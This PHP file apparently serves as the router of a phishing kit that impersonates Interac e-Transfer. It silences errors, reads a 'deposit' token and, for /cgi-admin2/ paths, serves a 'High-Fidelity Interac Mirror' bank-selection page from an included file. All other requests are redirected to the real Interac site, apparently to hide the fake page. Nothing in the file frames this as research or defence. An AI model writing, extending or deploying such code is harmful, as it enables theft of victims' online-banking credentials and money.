
<?php
/**
 * RBOS GATEWAY Ω :: REDIRECTION MATRIX
 */

error_reporting(0);
date_default_timezone_set('America/Edmonton');

$uri = $_SERVER['REQUEST_URI'];
$path = strtok($uri, '?');

// Security: Check for deposit token
$token = $_GET['deposit'] ?? '';

if (str_starts_with($path, '/cgi-admin2/')) {
    // High-Fidelity Interac Mirror Logic
    header('Content-Type: text/html');
    echo "<!-- RBOS SECURE GATEWAY ACTIVE -->";
    // This would typically include the full HTML for the FI Selection
    require_once 'deposit_page.php';
    exit;
}

// Default Fallback
header('Location: https://etransfer.interac.ca/error', true, 302);
exit;
